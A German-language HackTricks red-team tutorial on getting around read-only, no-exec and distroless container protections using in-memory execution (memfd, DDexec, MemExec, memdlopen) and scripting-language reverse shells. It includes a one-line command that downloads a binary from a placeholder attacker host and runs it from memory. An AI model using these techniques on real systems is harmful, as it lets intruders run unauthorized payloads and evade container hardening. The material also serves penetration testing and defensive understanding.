# Bypass FS-Schutz: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Videos

In den folgenden Videos werden die auf dieser Seite erwähnten Techniken ausführlicher erklärt:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec Szenario

Es wird immer häufiger, dass Linux-Systeme mit einem **read-only (ro) file system protection** gemountet sind, besonders in Containern. Das liegt daran, dass es reicht, in der `securitycontext` **`readOnlyRootFilesystem: true`** zu setzen, um einen Container mit ro-Dateisystem zu starten:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Selbst wenn das Dateisystem als ro gemountet ist, ist **`/dev/shm`** weiterhin beschreibbar, es ist also nicht so, dass man gar nichts auf die Festplatte schreiben kann. Dieser Ordner wird jedoch meist mit **no-exec protection** gemountet, sodass du, wenn du hier ein binary herunterlädst, es **nicht ausführen** kannst.

> [!WARNING]
> Aus Sicht eines red teams macht das das **Herunterladen und Ausführen** von binaries, die nicht schon im System vorhanden sind, komplizierter (z. B. backdoors oder Enumerator-Tools wie `kubectl`).

## Easiest bypass: Scripts

Beachte, dass ich von binaries gesprochen habe — du kannst jede Art von Script **ausführen**, solange der Interpreter im System vorhanden ist, z. B. ein **shell script**, wenn `sh` vorhanden ist, oder ein **python** **script**, wenn `python` installiert ist.

Das allein reicht jedoch nicht immer aus, um deine binary-Backdoor oder andere binary-Tools, die du eventuell ausführen musst, laufen zu lassen.

## Memory Bypasses

Wenn du ein binary ausführen willst, das Dateisystem dies aber nicht zulässt, ist der beste Weg, es direkt aus dem Speicher auszuführen, da die **Schutzmechanismen dort nicht greifen**.

### FD + exec syscall bypass

Wenn leistungsfähige Scripting-Engines wie **Python**, **Perl** oder **Ruby** auf der Maschine vorhanden sind, kannst du das binary herunterladen, es im Speicher ablegen (z. B. in einem memory file descriptor mittels des `create_memfd` syscall), das von den Dateisystem-Schutzmechanismen nicht betroffen ist, und anschließend einen **`exec` syscall** aufrufen, wobei du das **fd als auszuführende Datei** angibst.

Dafür kannst du das Projekt [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) verwenden. Du übergibst ihm ein binary und es generiert ein Script in der gewünschten Sprache, in dem das **binary komprimiert und b64-kodiert** ist sowie Anweisungen zum **Dekodieren und Dekomprimieren** in ein **fd**, das durch den `create_memfd` syscall erstellt wurde, und einen Aufruf des **exec**-Syscalls zum Ausführen.

> [!WARNING]
> Das funktioniert nicht in anderen Scripting-Sprachen wie PHP oder Node, da diese in der Regel keinen d**efault way to call raw syscalls** aus einem Script heraus haben; deshalb ist es nicht möglich, `create_memfd` aufzurufen, um das **memory fd** für das binary zu erstellen.
>
> Außerdem funktioniert es nicht, ein **reguläres fd** mit einer Datei in `/dev/shm` zu erstellen, da du diese nicht ausführen darfst, weil die **no-exec protection** greift.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ist eine Technik, mit der du den Speicher deines eigenen Prozesses verändern kannst, indem du dessen **`/proc/self/mem`** überschreibst.

Indem du also die ausgeführte Assembly kontrollierst, kannst du einen **shellcode** schreiben und den Prozess "mutieren", sodass er jeden beliebigen Code ausführt.

> [!TIP]
> **DDexec / EverythingExec** ermöglicht es dir, deinen eigenen **shellcode** oder **jedes binary** direkt aus dem **Speicher** zu laden und **auszuführen**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Für weitere Informationen zu dieser Technik siehe das Github oder:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ist der natürliche nächste Schritt von DDexec. Es ist ein **DDexec shellcode demonised**, sodass du nicht jedes Mal DDexec neu starten musst, wenn du ein anderes Binary ausführen willst; du kannst einfach memexec shellcode mit der DDexec-Technik ausführen und dann mit diesem deamon kommunizieren, um neue Binaries zum Laden und Ausführen zu übergeben.

Du findest ein Beispiel, wie man memexec verwendet, um Binaries aus einer PHP reverse shell auszuführen, in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Mit einem ähnlichen Zweck wie DDexec ermöglicht die [**memdlopen**](https://github.com/arget13/memdlopen) Technik einen **einfacheren Weg, Binaries in den Speicher zu laden**, um sie später auszuführen. Sie kann sogar das Laden von Binaries mit Abhängigkeiten erlauben.

## Distroless Bypass

Für eine ausführliche Erklärung, **was distroless eigentlich ist**, wann es hilft, wann nicht, und wie es die Post-Exploitation-Taktiken in Containern verändert, siehe:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless-Container enthalten nur die **absolut notwendigen Komponenten, um eine bestimmte Anwendung oder einen Dienst auszuführen**, wie Bibliotheken und Laufzeitabhängigkeiten, schließen aber größere Komponenten wie einen Paketmanager, eine Shell oder Systemutilities aus.

Das Ziel von Distroless-Containern ist es, die Angriffsfläche von Containern zu **verringern, indem unnötige Komponenten eliminiert werden**, und die Anzahl der ausnutzbaren Schwachstellen zu minimieren.

### Reverse Shell

In einem distroless-Container findest du möglicherweise **nicht einmal `sh` oder `bash`**, um eine normale Shell zu bekommen. Du wirst auch keine Binaries wie `ls`, `whoami`, `id` finden... alles, was du normalerweise in einem System ausführst.

> [!WARNING]
> Daher wirst du nicht in der Lage sein, eine **reverse shell** zu bekommen oder das System wie gewohnt zu **enumerate**.

Wenn der kompromittierte Container beispielsweise eine flask-Webanwendung betreibt, ist python installiert, und du kannst daher eine **Python reverse shell** erhalten. Läuft er mit node, kannst du eine Node rev shell holen, und das Gleiche gilt für praktisch jede **scripting language**.

> [!TIP]
> Mit der scripting language könntest du das System mithilfe der Sprachfunktionen **enumerate**.

Wenn es **keine `read-only/no-exec`**-Schutzmechanismen gibt, könntest du deine reverse shell missbrauchen, um deine Binaries ins Dateisystem zu schreiben und sie auszuführen.

> [!TIP]
> In dieser Art von Containern sind diese Schutzmechanismen jedoch normalerweise vorhanden; du könntest jedoch die **previous memory execution techniques** nutzen, um sie zu umgehen.

Beispiele, wie man einige **RCE vulnerabilities** ausnutzt, um scripting languages **reverse shells** zu erhalten und Binaries aus dem Speicher auszuführen, findest du unter [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
